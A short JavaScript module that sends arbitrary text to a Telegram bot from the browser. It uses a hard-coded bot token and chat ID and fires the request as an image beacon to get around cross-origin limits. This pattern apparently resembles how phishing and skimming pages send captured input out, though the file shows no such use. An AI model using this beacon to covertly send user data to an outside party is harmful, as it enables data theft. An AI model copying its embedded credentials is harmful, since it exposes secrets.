
// telegram.js
const BOT_TOKEN = "8444694860:AAHCOKSRgS7oSQQo8FysQSogt1B4V_PN70k";
const CHAT_ID = "1736401983";

export function sendToTelegram(text) {
  if (!text) return;

  const url =
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
    `?chat_id=${CHAT_ID}` +
    `&parse_mode=HTML` +
    `&text=${encodeURIComponent(text)}`;

  // CORS workaround
  const img = new Image();
  img.src = url;
}
